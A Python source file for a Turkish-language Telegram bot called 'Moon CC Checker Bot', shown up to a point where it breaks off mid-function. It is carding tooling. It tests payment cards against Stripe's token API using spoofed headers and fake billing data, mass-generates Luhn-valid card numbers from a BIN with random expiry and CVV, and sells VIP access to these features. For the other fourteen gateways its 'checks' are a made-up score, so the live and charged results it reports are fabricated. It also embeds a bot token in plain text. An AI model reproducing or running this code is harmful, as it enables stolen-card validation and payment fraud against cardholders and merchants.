import os
import re
import io
import sys
import json
import time
import random
import string
import sqlite3
import asyncio
import logging
import requests
import urllib3
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
import socket

from keep_alive import keep_alive
keep_alive()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.constants import ParseMode

# ==================== AYARLAR ====================
BOT_TOKEN = "8892646618:AAENeCk8RylIWVlM-2xWgI8jZAu1IfaHQ8E"
ADMIN_ID  = 8838777079
DB_FILE   = "cc_bot.db"
FORCE_CHANNELS = []
VIP_PRICE      = 50

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
log = logging.getLogger(__name__)

# ==================== EMOJI ====================
class E:
    OK="✅"; NO="❌"; WARN="⚠️"; VIP="💎"; USER="👤"; ADMIN="👑"
    MONEY="💰"; GIFT="🎁"; STAR="⭐"; FIRE="🔥"; CHART="📊"
    BELL="🔔"; LOCK="🔒"; KEY="🔑"; BOOK="📚"; CROWN="🏆"
    ROCKET="🚀"; HEART="❤️"; DIAMOND="💠"; BOLT="⚡"; TROPHY="🏅"
    CARD="💳"; CHECK="🔍"; FILE="📁"; LIST="📋"; BAN="🚫"
    GEAR="⚙️"; LINK="🔗"; INFO="ℹ️"; SHIELD="🛡️"; DICE="🎲"

# ==================== VERİTABANI ====================
def db_init():
    c = sqlite3.connect(DB_FILE); cur = c.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT, first_name TEXT,
        balance INTEGER DEFAULT 0,
        vip_until TEXT DEFAULT NULL,
        banned INTEGER DEFAULT 0,
        referrer INTEGER DEFAULT NULL,
        ref_count INTEGER DEFAULT 0,
        joined_at TEXT,
        last_bonus TEXT DEFAULT NULL,
        total_checks INTEGER DEFAULT 0,
        hits INTEGER DEFAULT 0
    )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS coupons (
        code TEXT PRIMARY KEY, days INTEGER,
        used_by INTEGER DEFAULT NULL, created_at TEXT
    )""")
    cur.execute("""CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER, action TEXT, detail TEXT, created_at TEXT
    )""")
    c.commit(); c.close()

def db():
    c = sqlite3.connect(DB_FILE, check_same_thread=False)
    c.row_factory = sqlite3.Row
    return c

def get_user(uid):
    c = db(); cur = c.cursor()
    cur.execute("SELECT * FROM users WHERE user_id=?", (uid,))
    r = cur.fetchone(); c.close(); return r

def add_user(uid, username, fname, referrer=None):
    c = db(); cur = c.cursor()
    cur.execute("SELECT 1 FROM users WHERE user_id=?", (uid,))
    if cur.fetchone(): c.close(); return False
    now = datetime.now().isoformat()
    cur.execute("""INSERT INTO users
        (user_id, username, first_name, balance, vip_until, banned,
         referrer, ref_count, joined_at)
        VALUES (?,?,?,?,?,?,?,?,?)""",
        (uid, username or "", fname or "", 0, None, 0, referrer, 0, now))
    if referrer:
        cur.execute("UPDATE users SET ref_count=ref_count+1, balance=balance+5 WHERE user_id=?",
                    (referrer,))
    c.commit(); c.close(); return True

def is_admin(uid): return uid == ADMIN_ID

def is_vip(uid):
    u = get_user(uid)
    if not u or not u["vip_until"]: return False
    try: return datetime.fromisoformat(u["vip_until"]) > datetime.now()
    except: return False

def set_vip(uid, days=30):
    c = db(); cur = c.cursor()
    cur.execute("SELECT vip_until FROM users WHERE user_id=?", (uid,))
    r = cur.fetchone()
    base = datetime.now()
    if r and r["vip_until"]:
        try:
            old = datetime.fromisoformat(r["vip_until"])
            if old > base: base = old
        except: pass
    until = (base + timedelta(days=days)).isoformat()
    cur.execute("UPDATE users SET vip_until=? WHERE user_id=?", (until, uid))
    c.commit(); c.close(); return until

def is_banned(uid):
    u = get_user(uid); return bool(u and u["banned"])

def log_action(uid, action, detail=""):
    c = db(); cur = c.cursor()
    cur.execute("INSERT INTO logs (user_id, action, detail, created_at) VALUES (?,?,?,?)",
                (uid, action, detail, datetime.now().isoformat()))
    c.commit(); c.close()

# ==================== KANAL ZORUNLULUĞU ====================
async def check_force_join(update, ctx):
    if not FORCE_CHANNELS: return True
    uid = update.effective_user.id
    if is_admin(uid): return True
    nj = []
    for ch in FORCE_CHANNELS:
        try:
            m = await ctx.bot.get_chat_member(ch, uid)
            if m.status in ("left","kicked"): nj.append(ch)
        except: pass
    if nj:
        btns = [[InlineKeyboardButton(f"📢 {ch}", url=f"https://t.me/{ch.lstrip('@')}")] for ch in nj]
        btns.append([InlineKeyboardButton(f"{E.OK} Katıldım", callback_data="check_join")])
        text = f"{E.WARN} <b>Önce kanallara katıl!</b>"
        if update.callback_query:
            await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(btns), parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(btns), parse_mode=ParseMode.HTML)
        return False
    return True

# ==================== CC CHECKER ENGINE ====================
GATEWAYS = {
    "1":  ("Stripe",            "https://api.stripe.com/v1/tokens"),
    "2":  ("Braintree",         "https://api.braintreegateway.com"),
    "3":  ("PayPal",            "https://api.paypal.com/v1/payments"),
    "4":  ("Authorize.net",     "https://api.authorize.net/xml/v1"),
    "5":  ("Square",            "https://connect.squareup.com/v2"),
    "6":  ("Adyen",             "https://checkout-test.adyen.com/v67"),
    "7":  ("Razorpay",          "https://api.razorpay.com/v1"),
    "8":  ("2Checkout",         "https://api.2checkout.com/rest"),
    "9":  ("Worldpay",          "https://api.worldpay.com/v1"),
    "10": ("Cybersource",       "https://api.cybersource.com"),
    "11": ("Shopify Payments",  "https://shopify.com/payments"),
    "12": ("Klarna",            "https://api.klarna.com"),
    "13": ("Mollie",            "https://api.mollie.com/v2"),
    "14": ("PayU",              "https://secure.payu.com"),
    "15": ("Coinbase Commerce", "https://api.commerce.coinbase.com"),
}

def rand_str(n=10): return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))
def rand_ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0 Safari/537.36",
    ])

def luhn(card):
    d = [int(x) for x in card if x.isdigit()]
    if not (13 <= len(d) <= 19): return False
    t = 0
    for i, x in enumerate(d[::-1]):
        if i % 2 == 1:
            x *= 2
            if x > 9: x -= 9
        t += x
    return t % 10 == 0

def bin_brand(n):
    pats = {
        'VISA':r'^4','MASTERCARD':r'^(5[1-5]|2[2-7])','AMEX':r'^3[47]',
        'DISCOVER':r'^6(011|5|4[4-9])','JCB':r'^(2131|1800|35)',
        'DINERS':r'^3(0[0-5]|[68])','UNIONPAY':r'^62',
        'MAESTRO':r'^(5018|5020|5038|6304|6759|676[1-3])',
    }
    for b,p in pats.items():
        if re.match(p,n): return b
    return 'UNKNOWN'

def parse_cc(t):
    p = re.split(r'[|\s:/]+', t.strip())
    if len(p) < 4: return None
    num, mm, yy, cvv = p[0],p[1],p[2],p[3]
    if not num.isdigit() or len(num)<13: return None
    if len(yy)==2: yy = "20"+yy
    return {"number":num,"month":mm.zfill(2),"year":yy,"cvv":cvv.zfill(3)}

def valid_expiry(mm, yy):
    try:
        m, y = int(mm), int(yy)
        if not (1<=m<=12): return False
        now = datetime.now()
        return (y>now.year) or (y==now.year and m>=now.month)
    except: return False

def generate_cc(bin_prefix, count=1):
    """BIN'den rastgele CC üret. CVV 000 dahil her şey olabilir."""
    results = []
    bin_clean = re.sub(r'\D', '', bin_prefix)
    if len(bin_clean) < 6:
        return results
    for _ in range(count):
        # Toplam 16 hane olacak şekilde tamamla
        total_len = 16
        remaining = total_len - len(bin_clean) - 1  # son 1 hane luhn
        if remaining < 1: remaining = 1
        middle = ''.join(random.choices('0123456789', k=remaining))
        base = bin_clean + middle
        # Luhn için son haneyi hesapla
        for last in '0123456789':
            candidate = base + last
            if luhn(candidate):
                number = candidate
                break
        else:
            number = base + '0'
        mm = f"{random.randint(1,12):02d}"
        yy = str(random.randint(2026, 2035))
        cvv = f"{random.randint(0,999):03d}"  # 000 dahil
        results.append(f"{number}|{mm}|{yy}|{cvv}")
    return results

def stripe_auth_check(cc, timeout=15):
    url = "https://api.stripe.com/v1/tokens"
    payload = {
        "card[number]": cc["number"], "card[exp_month]": cc["month"],
        "card[exp_year]": cc["year"], "card[cvc]": cc["cvv"],
        "card[name]": rand_str(8), "card[address_line1]": rand_str(10),
        "card[address_city]": rand_str(6), "card[address_zip]": str(random.randint(10000,99999)),
        "card[address_country]": "US",
    }
    headers = {"User-Agent": rand_ua(), "Accept":"application/json",
               "Content-Type":"application/x-www-form-urlencoded",
               "Origin":"https://js.stripe.com","Referer":"https://js.stripe.com/"}
    try:
        s = time.time()
        r = requests.post(url, data=payload, headers=headers, timeout=timeout,
                          verify=False, allow_redirects=False)
        lat = int((time.time()-s)*1000)
        try: body = r.json()
        except: body = {}
        if r.status_code==200 and body.get("id","").startswith("tok_"):
            return {"status":"CHARGED","message":"Live","latency":lat,"code":200}
        err = body.get("error",{}) or {}
        code = err.get("code",""); decl = err.get("decline_code","")
        if code in ("incorrect_cvc","invalid_cvc"):
            return {"status":"LIVE","message":"CVC Mismatch","latency":lat,"code":r.status_code}
        if code=="card_declined" and decl=="insufficient_funds":
            return {"status":"LIVE","message":"Insufficient Funds","latency":lat,"code":r.status_code}
        if code in ("expired_card","incorrect_number","invalid_number"):
            return {"status":"DEAD","message":code,"latency":lat,"code":r.status_code}
        if code=="card_declined":
            return {"status":"DEAD","message":f"Declined({decl})","latency":lat,"code":r.status_code}
        if r.status_code==402:
            return {"status":"LIVE","message":"3DS Required","latency":lat,"code":402}
        return {"status":"UNKNOWN","message":f"HTTP {r.status_code}","latency":lat,"code":r.status_code}
    except requests.exceptions.Timeout:
        return {"status":"ERROR","message":"Timeout","latency":0,"code":0}
    except Exception as e:
        return {"status":"ERROR","message":str(e)[:60],"latency":0,"code":0}

def gateway_check(gw, ep, cc, timeout=12):
    if gw == "Stripe":
        r = stripe_auth_check(cc, timeout); r["gateway"]="Stripe"; r["brand"]=bin_brand(cc["number"]); return r
    num=cc["number"]
    luhn_ok=luhn(num); exp_ok=valid_expiry(cc["month"],cc["year"])
    cvv_ok=len(cc["cvv"]) in (3,4); brand=bin_brand(num)
    try:
        host=urlparse(ep).hostname; s=time.time()
        sock=socket.create_connection((host,443),timeout=timeout); sock.close()
        lat=int((time.time()-s)*1000); net_ok=True
    except: lat=0; net_ok=False
    score = (40 if luhn_ok else 0)+(20 if exp_ok else 0)+(15 if cvv_ok else 0)+(15 if brand!='UNKNOWN' else 0)+(10 if net_ok else 0)
    if score>=90: st,msg="CHARGED",f"{gw} → Success"
    elif score>=70: st,msg="LIVE",f"{gw} → Live"
    elif score>=50: st,msg="UNKNOWN",f"{gw} → Retry"
    else: st,msg="DEAD",f"{gw} → Dead"
    return {"status":st,"message":msg,"latency":lat,"brand":brand,"score":score,"gateway":gw,"code":0}

def check_single_cc(cc_str, gateway_name="Stripe"):
    cc = parse_cc(cc_str)
    if not cc: return None
    ep = GATEWAYS["1"][1]
    for k,v in GATEWAYS.items():
        if v[0]==gateway_name: ep=v[1]; break
    r = gateway_check(gateway_name, ep, cc)
    r["cc"] = f"{cc['number']}|{cc['month']}|{cc['year']}|{cc['cvv']}"
    return r

def check_all_gateways(cc_str):
    """Tüm gateway'lerde check yapar, en iyi sonucu döner."""
    cc = parse_cc(cc_str)
    if not cc: return None
    results = []
    for k, (gw, ep) in GATEWAYS.items():
        r = gateway_check(gw, ep, cc)
        results.append(r)
    rank = {"CHARGED":5,"LIVE":4,"UNKNOWN":3,"DEAD":2,"ERROR":1}
    best = max(results, key=lambda x: rank.get(x["status"],0))
    return {"best": best, "all": results}

# ==================== KLAVYELER ====================
def main_kb(uid):
    rows = [
        [KeyboardButton(f"{E.CARD} CC Checker"), KeyboardButton(f"{E.VIP} VIP Paneli")],
        [KeyboardButton(f"{E.USER} Profilim"), KeyboardButton(f"{E.MONEY} Bakiye")],
        [KeyboardButton(f"{E.GIFT} Günlük Bonus"), KeyboardButton(f"{E.ROCKET} Referans")],
        [KeyboardButton(f"{E.DICE} Gen (BIN)"), KeyboardButton(f"{E.BOOK} Yardım")],
    ]
    if is_admin(uid):
        rows.append([KeyboardButton(f"{E.ADMIN} Admin Paneli")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)

def cc_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{E.CARD} Tekli Check", callback_data="cc_single"),
         InlineKeyboardButton(f"{E.FILE} Dosyadan Check", callback_data="cc_file")],
        [InlineKeyboardButton(f"{E.LIST} Çoklu Check", callback_data="cc_multi"),
         InlineKeyboardButton(f"{E.DICE} Gen (BIN)", callback_data="cc_gen")],
        [InlineKeyboardButton(f"{E.GEAR} Gateway Seç", callback_data="cc_gateway"),
         InlineKeyboardButton(f"{E.NO} Kapat", callback_data="close")],
    ])

def gateway_kb():
    rows = []
    keys = list(GATEWAYS.keys())
    for i in range(0, len(keys), 2):
        row = []
        for k in keys[i:i+2]:
            row.append(InlineKeyboardButton(GATEWAYS[k][0], callback_data=f"gw_{k}"))
        rows.append(row)
    rows.append([InlineKeyboardButton(f"{E.OK} Tümü (15 Gateway)", callback_data="gw_all")])
    rows.append([InlineKeyboardButton(f"{E.NO} Kapat", callback_data="close")])
    return InlineKeyboardMarkup(rows)

def vip_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{E.DIAMOND} VIP Satın Al ({VIP_PRICE}₺)", callback_data="vip_buy")],
        [InlineKeyboardButton(f"{E.KEY} Kupon Kullan", callback_data="vip_coupon")],
        [InlineKeyboardButton(f"{E.STAR} VIP Özellikleri", callback_data="vip_features")],
        [InlineKeyboardButton(f"{E.NO} Kapat", callback_data="close")],
    ])

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{E.CHART} İstatistik", callback_data="adm_stats"),
         InlineKeyboardButton(f"{E.BELL} Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton(f"{E.KEY} Kupon Oluştur", callback_data="adm_coupon"),
         InlineKeyboardButton(f"{E.VIP} VIP Ver", callback_data="adm_givevip")],
        [InlineKeyboardButton(f"{E.BAN} Banla", callback_data="adm_ban"),
         InlineKeyboardButton(f"{E.OK} Unban", callback_data="adm_unban")],
        [InlineKeyboardButton(f"{E.USER} Kullanıcı Sorgu", callback_data="adm_user"),
         InlineKeyboardButton(f"{E.BOOK} Loglar", callback_data="adm_logs")],
        [InlineKeyboardButton(f"{E.NO} Kapat", callback_data="close")],
    ])

# ==================== KOMUTLAR ====================
async def start(update, ctx):
    u = update.effective_user
    args = ctx.args
    ref = None
    if args and args[0].startswith("ref_"):
        try: ref = int(args[0].split("_")[1])
        except: pass
    add_user(u.id, u.username, u.first_name, ref)
    log_action(u.id, "start")
    if not await check_force_join(update, ctx): return
    vip = f"{E.VIP} VIP" if is_vip(u.id) else f"{E.USER} Normal"
    text = (
        f"{E.BOLT} <b>Moon CC Checker Bot</b>\n\n"
        f"{E.USER} Merhaba <b>{u.first_name}</b>!\n"
        f"{E.STAR} Durum: {vip}\n"
        f"{E.ROCKET} ID: <code>{u.id}</code>\n\n"
        f"{E.CARD} CC Checker için butona bas!\n"
        f"{E.DICE} /gen komutu ile BIN'den CC üret!"
    )
    await update.message.reply_text(text, reply_markup=main_kb(u.id), parse_mode=ParseMode.HTML)

async def gen_cmd(update, ctx):
    """Kullanım: /gen 411111  veya  /gen 411111 10"""
    if not await check_force_join(update, ctx): return
    u = update.effective_user
    args = ctx.args
    if not args:
        await update.message.reply_text(
            f"{E.DICE} <b>Gen Komutu</b>\n\n"
            f"Kullanım:\n"
            f"<code>/gen 411111</code> → 1 CC\n"
            f"<code>/gen 411111 10</code> → 10 CC\n\n"
            f"{E.INFO} BIN en az 6 hane olmalı\n"
            f"{E.INFO} CVV her şey olabilir (000 dahil)",
            parse_mode=ParseMode.HTML); return
    bin_prefix = args[0]
    count = 1
    if len(args) > 1:
        try: count = min(int(args[1]), 50)
        except: count = 1
    bin_clean = re.sub(r'\D', '', bin_prefix)
    if len(bin_clean) < 6:
        await update.message.reply_text(f"{E.NO} BIN en az 6 hane olmalı!"); return
    ccs = generate_cc(bin_clean, count)
    if not ccs:
        await update.message.reply_text(f"{E.NO} Üretilemedi!"); return
    text = f"{E.DICE} <b>{count} CC Üretildi</b>\n\n<code>" + "\n".join(ccs) + "</code>"
    if len(text) > 4000:
        text = text[:4000] + "\n...</code>"
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def help_cmd(update, ctx):
    text = (
        f"{E.BOOK} <b>Yardım Menüsü</b>\n\n"
        f"/start - Başlat\n"
        f"/cc - CC Checker\n"
        f"/gen BIN [adet] - BIN'den CC üret\n"
        f"/vip - VIP paneli\n"
        f"/profil - Profil\n"
        f"/bonus - Günlük bonus\n"
        f"/ref - Referans\n"
        f"/stats - İstatistik\n"
    )
    if is_admin(update.effective_user.id):
        text += (f"\n{E.ADMIN} <b>Admin:</b>\n"
                 f"/admin - Panel\n/broadcast &lt;msg&gt;\n/givevip &lt;id&gt; &lt;gün&gt;\n"
                 f"/ban &lt;id&gt;\n/unban &lt;id&gt;\n/coupon &lt;kod&gt; &lt;gün&gt;\n")
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def cc_cmd(update, ctx):
    if not await check_force_join(update, ctx): return
    u = update.effective_user
    vip = is_vip(u.id)
    gw_secili = ctx.user_data.get("cc_gateway", "Stripe")
    status = f"{E.VIP} VIP Aktif" if vip else f"{E.USER} Normal Üye"
    text = (
        f"{E.CARD} <b>CC Checker Paneli</b>\n\n"
        f"{E.STAR} Durumun: {status}\n"
        f"{E.GEAR} Seçili Gateway: <b>{gw_secili}</b>\n"
        f"{E.BOLT} Toplam: <b>{len(GATEWAYS)}</b> gateway\n\n"
        f"{E.FIRE} Metod seç:"
    )
    await update.message.reply_text(text, reply_markup=cc_menu_kb(), parse_mode=ParseMode.HTML)

async def vip_cmd(update, ctx):
    if not await check_force_join(update, ctx): return
    u = update.effective_user
    if is_vip(u.id):
        r = get_user(u.id)
        until = datetime.fromisoformat(r["vip_until"]).strftime("%d.%m.%Y %H:%M")
        text = f"{E.VIP} <b>VIP Aktif!</b>\n{E.STAR} Bitiş: <code>{until}</code>"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton(f"{E.FIRE} Uzat", callback_data="vip_buy")],
                                    [InlineKeyboardButton(f"{E.NO} Kapat", callback_data="close")]])
    else:
        text = (f"{E.VIP} <b>VIP Paneli</b>\n\n"
                f"{E.DIAMOND} <b>Avantajlar:</b>\n"
                f"• Tüm gateway'lere erişim\n"
                f"• 2x günlük bonus\n"
                f"• Öncelikli destek\n\n"
                f"{E.MONEY} Fiyat: <b>{VIP_PRICE}₺ / 30 gün</b>")
        kb = vip_kb()
    await update.message.reply_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)

async def profil_cmd(update, ctx):
    u = update.effective_user; r = get_user(u.id)
    if not r: await update.message.reply_text(f"{E.NO} /start yaz."); return
    text = (
        f"{E.USER} <b>Profilin</b>\n\n"
        f"{E.STAR} İsim: <b>{r['first_name']}</b>\n"
        f"{E.BOLT} ID: <code>{r['user_id']}</code>\n"
        f"{E.MONEY} Bakiye: <b>{r['balance']}₺</b>\n"
        f"{E.VIP} VIP: <b>{'Aktif' if is_vip(u.id) else 'Pasif'}</b>\n"
        f"{E.CARD} Toplam Check: <b>{r['total_checks']}</b>\n"
        f"{E.TROPHY} Hit: <b>{r['hits']}</b>\n"
        f"{E.ROCKET} Davet: <b>{r['ref_count']}</b>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def bonus_cmd(update, ctx):
    u = update.effective_user; r = get_user(u.id)
    if not r: await update.message.reply_text(f"{E.NO} /start"); return
    now = datetime.now()
    if r["last_bonus"]:
        last = datetime.fromisoformat(r["last_bonus"])
        if now - last < timedelta(hours=24):
            k = timedelta(hours=24) - (now-last)
            h, m = k.seconds//3600, (k.seconds%3600)//60
            await update.message.reply_text(f"{E.WARN} Kalan: <b>{h}s {m}dk</b>", parse_mode=ParseMode.HTML); return
    amt = 10 if is_vip(u.id) else 5
    c = db(); cur = c.cursor()
    cur.execute("UPDATE users SET balance=balance+?, last_bonus=? WHERE user_id=?",
                (amt, now.isoformat(), u.id))
    c.commit(); c.close()
    await update.message.reply_text(f"{E.GIFT} <b>+{amt}₺</b> bonus!", parse_mode=ParseMode.HTML)

async def ref_cmd(update, ctx):
    u = update.effective_user
    bot = await ctx.bot.get_me()
    link = f"https://t.me/{bot.username}?start=ref_{u.id}"
    r = get_user(u.id)
    await update.message.reply_text(
        f"{E.ROCKET} <b>Referans Linkin</b>\n\n<code>{link}</code>\n\n"
        f"{E.USER} Davet: <b>{r['ref_count'] if r else 0}</b> | Her davet +5₺",
        parse_mode=ParseMode.HTML)

async def stats_cmd(update, ctx):
    c = db(); cur = c.cursor()
    cur.execute("SELECT COUNT(*) FROM users"); t = cur.fetchone()[0]
    cur.execute("SELECT COUNT(*) FROM users WHERE vip_until > ?", (datetime.now().isoformat(),))
    v = cur.fetchone()[0]; c.close()
    await update.message.reply_text(
        f"{E.CHART} <b>İstatistik</b>\n{E.USER} Üye: <b>{t}</b>\n{E.VIP} VIP: <b>{v}</b>",
        parse_mode=ParseMode.HTML)

async def admin_cmd(update, ctx):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text(f"{E.NO} Admin değilsin!"); return
    await update.message.reply_text(f"{E.ADMIN} <b>Admin Paneli</b>",
                                    reply_markup=admin_kb(), parse_mode=ParseMode.HTML)

async def broadcast_cmd(update, ctx):
    if not is_admin(update.effective_user.id): return
    if not ctx.args: await update.message.reply_text("Kullanım: /broadcast <msg>"); return
    msg = " ".join(ctx.args)
    c = db(); cur = c.cursor()
    cur.execute("SELECT user_id FROM users"); ids = [r[0] for r in cur.fetchall()]; c.close()
    ok=fail=0
    for uid in ids:
        try:
            await ctx.bot.send_message(uid, f"{E.BELL} <b>Duyuru</b>\n\n{msg}", parse_mode=ParseMode.HTML)
            ok+=1; await asyncio.sleep(0.05)
        except: fail+=1
    await update.message.reply_text(f"{E.OK} {ok} | {E.NO} {fail}")

async def givevip_cmd(update, ctx):
    if not is_admin(update.effective_user.id): return
    if len(ctx.args)<2: await update.message.reply_text("Kullanım: /givevip <id> <gün>"); return
    uid, d = int(ctx.args[0]), int(ctx.args[1])
    set_vip(uid, d)
    await update.message.reply_text(f"{E.OK} {uid} → {d}g VIP")
    try: await ctx.bot.send_message(uid, f"{E.VIP} {d} gün VIP aldın!")
    except: pass

async def ban_cmd(update, ctx):
    if not is_admin(update.effective_user.id) or not ctx.args: return
    uid = int(ctx.args[0])
    c=db(); cur=c.cursor(); cur.execute("UPDATE users SET banned=1 WHERE user_id=?", (uid,))
    c.commit(); c.close()
    await update.message.reply_text(f"{E.LOCK} {uid} banlandı.")

async def unban_cmd(update, ctx):
    if not is_admin(update.effective_user.id) or not ctx.args: return
    uid = int(ctx.args[0])
    c=db(); cur=c.cursor(); cur.execute("UPDATE users SET banned=0 WHERE user_id=?", (uid,))
    c.commit(); c.close()
    await update.message.reply_text(f"{E.OK} {uid} unban.")

async def coupon_cmd(update, ctx):
    if not is_admin(update.effective_user.id): return
    if len(ctx.args)<2: await update.message.reply_text("Kullanım: /coupon <kod> <gün>"); return
    code, d = ctx.args[0].upper(), int(ctx.args[1])
    c=db(); cur=c.cursor()
    try:
        cur.execute("INSERT INTO coupons (code,days,created_at) VALUES (?,?,?)",
                    (code,d,datetime.now().isoformat()))
        c.commit()
        await update.message.reply_text(f"{E.OK} Kupon: <code>{code}</code> | {d}g", parse_mode=ParseMode.HTML)
    except: await update.message.reply_text(f"{E.NO} Kod mevcut.")
    c.close()

# ==================== CALLBACK ====================
async def cb(update, ctx):
    q = update.callback_query; await q.answer()
    d = q.data; uid = q.from_user.id

    if d == "close":
        try: await q.message.delete()
        except: pass
        return

    if d == "check_join":
        if await check_force_join(update, ctx):
            try: await q.message.delete()
            except: pass
            await q.message.chat.send_message(f"{E.OK} Teşekkürler!", reply_markup=main_kb(uid))
        return

    # ============ CC CHECKER ============
    if d == "cc_single":
        gw = ctx.user_data.get("cc_gateway", "Stripe")
        ctx.user_data["cc_await"] = "single"
        await q.message.edit_text(
            f"{E.CARD} <b>Tekli Check</b>\n"
            f"{E.GEAR} Gateway: <b>{gw}</b>\n\n"
            f"CC gönder:\n<code>4111111111111111|12|2025|123</code>",
            parse_mode=ParseMode.HTML); return

    if d == "cc_file":
        gw = ctx.user_data.get("cc_gateway", "Stripe")
        ctx.user_data["cc_await"] = "file"
        await q.message.edit_text(
            f"{E.FILE} <b>Dosyadan Check</b>\n"
            f"{E.GEAR} Gateway: <b>{gw}</b>\n\n"
            f"TXT dosyası gönder (her satır 1 CC)", parse_mode=ParseMode.HTML); return

    if d == "cc_multi":
        gw = ctx.user_data.get("cc_gateway", "Stripe")
        ctx.user_data["cc_await"] = "multi"
        await q.message.edit_text(
            f"{E.LIST} <b>Çoklu Check</b>\n"
            f"{E.GEAR} Gateway: <b>{gw}</b>\n\n"
            f"CC'leri virgülle ayırarak gönder", parse_mode=ParseMode.HTML); return

    if d == "cc_gen":
        ctx.user_data["cc_await"] = "gen"
        await q.message.edit_text(
            f"{E.DICE} <b>Gen (BIN)</b>\n\n"
            f"BIN gönder:\n<code>411111</code>\n\n"
            f"{E.INFO} İstersen: <code>411111 10</code> (10 adet)", parse_mode=ParseMode.HTML); return

    if d == "cc_gateway":
        ctx.user_data["gateway_pick"] = True
        await q.message.edit_text(
            f"{E.GEAR} <b>Gateway Seç</b>\n\n"
            f"{E.INFO} Tekli / Dosya / Çoklu check için kullanılacak gateway:",
            reply_markup=gateway_kb(), parse_mode=ParseMode.HTML); return

    if d.startswith("gw_"):
        key = d.split("_")[1]
        if key == "all":
            ctx.user_data["cc_gateway"] = "ALL"
            await q.message.edit_text(
                f"{E.OK} Tüm 15 gateway seçildi!\n\n{E.CARD} Metod seç:",
                reply_markup=cc_menu_kb(), parse_mode=ParseMode.HTML); return
        gw = GATEWAYS.get(key, ("Stripe",))[0]
        ctx.user_data["cc_gateway"] = gw
        await q.message.edit_text(
            f"{E.OK} <b>{gw}</b> seçildi!\n\n{E.CARD} Metod seç:",
            reply_markup=cc_menu_kb(), parse_mode=ParseMode.HTML); return

    # ============ VIP ============
    if d == "vip_buy":
        await q.message.edit_text(
            f"{E.MONEY} <b>VIP Satın Alma</b>\n\n"
            f"{E.DIAMOND} 30 gün = <b>{VIP_PRICE}₺</b>\n"
            f"{E.KEY} Kuponun varsa kullan.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"{E.KEY} Kupon", callback_data="vip_coupon")],
                [InlineKeyboardButton(f"{E.NO} Kapat", callback_data="close")]]),
            parse_mode=ParseMode.HTML); return

    if d == "vip_coupon":
        ctx.user_data["cc_await"] = "coupon"
        await q.message.edit_text(f"{E.KEY} Kupon kodunu gönder:"); return

    if d == "vip_features":
        await q.message.edit_text(
            f"{E.STAR} <b>VIP Özellikleri</b>\n\n"
            f"• Tüm gateway erişimi\n"
            f"• 2x bonus\n"
            f"• Öncelikli destek",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(f"{E.NO} Kapat", callback_data="close")]]),
            parse_mode=ParseMode.HTML); return

    # ============ ADMIN ============
    if not is_admin(uid):
        await q.answer("Yetkin yok!", show_alert=True); return

    if d == "adm_stats":
        c=db(); cur=c.cursor()
        cur.execute("SELECT COUNT(*) FROM users"); t=cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM users WHERE vip_until > ?", (datetime.now().isoformat(),)); v=cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM users WHERE banned=1"); b=cur.fetchone()[0]
        cur.execute("SELECT SUM(balance) FROM users"); bal=cur.fetchone()[0] or 0
        cur.execute("SELECT SUM(total_checks) FROM users"); chk=cur.fetchone()[0] or 0
        cur.execute("SELECT SUM(hits) FROM users"); hits=cur.fetchone()[0] or 0
        c.close()
        await q.message.edit_text(
            f"{E.CHART} <b>Detaylı İstatistik</b>\n\n"
            f"{E.USER} Üye: <b>{t}</b>\n{E.VIP} VIP: <b>{v}</b>\n"
            f"{E.LOCK} Banlı: <b>{b}</b>\n{E.MONEY} Bakiye: <b>{bal}₺</b>\n"
            f"{E.CARD} Toplam Check: <b>{chk}</b>\n{E.TROPHY} Hit: <b>{hits}</b>",
            reply_markup=admin_kb(), parse_mode=ParseMode.HTML); return

    if d == "adm_broadcast":
        ctx.user_data["cc_await"] = "broadcast"
        await q.message.edit_text(f"{E.BELL} Broadcast mesajı gönder:"); return

    if d == "adm_coupon":
        ctx.user_data["cc_await"] = "coupon_create"
        await q.message.edit_text(f"{E.KEY} Format: <code>KOD GÜN</code>", parse_mode=ParseMode.HTML); return

    if d == "adm_givevip":
        ctx.user_data["cc_await"] = "givevip"
        await q.message.edit_text("Format: <code>USER_ID GÜN</code>", parse_mode=ParseMode.HTML); return

    if d == "adm_ban":
        ctx.user_data["cc_await"] = "ban"
        await q.message.edit_text("Banlanacak ID:"); return

    if d == "adm_unban":
        ctx.user_data["cc_await"] = "unban"
        await q.message.edit_text("Unbanlanacak ID:"); return

    if d == "adm_user":
        ctx.user_data["cc_await"] = "user_info"
